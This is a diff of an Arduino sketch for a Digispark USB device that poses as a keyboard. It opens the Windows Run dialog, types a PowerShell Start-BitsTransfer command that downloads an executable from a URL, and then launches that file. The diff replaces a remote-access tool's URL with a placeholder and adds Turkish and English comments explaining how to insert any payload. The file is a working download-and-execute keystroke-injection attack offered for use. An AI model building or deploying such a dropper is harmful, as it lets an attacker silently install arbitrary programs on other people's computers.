@@ -1,13 +1,15 @@
 #define kbd_tr_tr
+// TÜRKÇE KLAVYE KULLANIYORSAN ELLEME
+// Change here if you are using an English keyboard.  kbd_en_en
+
 #include "DigiKeyboard.h"
 
 void setup() {
-  // put your setup code here, to run once:
+  
 
 }
 
 void loop() {
-  // put your main code here, to run repeatedly:
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
@@ -16,8 +18,9 @@ void loop() {
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  // HTTPS KISMINDAN İTİBAREN İNDİRMEK İSTEDİĞİNİZ DOSYASNIN KONUMUNU GİRİNİZ BİR BOŞLUK BIRAKIP NE KAYDEDİLME İSMİNİ GİRİN ÖRN:DENEME.EXE
-  DigiKeyboard.print("Start-Bitstransfer https://www.alpemix.com/site/Alpemix.exe Alpemixx.exe");
+  // HTTPS KISMINDAN İTİBAREN İNDİRMEK İSTEDİĞİNİZ DOSYANIN KONUMUNU GİRİNİZ. BİR BOŞLUK BIRAKIP KAYDEDİLMESİ İSTENEN İSMİ GİRİNİZ.
+  // ENTER THE LOCATION OF THE FILE YOU WANT TO DOWNLOAD FROM HTTPS. ENTER THE NAME REQUESTED TO BE SAVED WITH.
+  DigiKeyboard.print("Start-Bitstransfer https://www.youwebsite.com/file.exe file.exe");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   // BURADAKİ SANİYE MİKTARI DOSYANIN BOYUTUNA GÖRE DÜŞÜRÜLÜR VEYA YÜKSELTİLİR:
@@ -28,8 +31,9 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
-  // 20.SATIRSA KAYDETTİĞİNİZ İSMİ GİRİNİZ ÖRN:DENEME.EXE
-  DigiKeyboard.print("Alpemixx.exe");
+  // 20.SATIRDA KAYDETTİĞİNİZ İSMİ GİRİNİZ.
+  // ENTER THE NAME YOU SAVED IN LINE 20.
+  DigiKeyboard.print("file.exe");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1500);
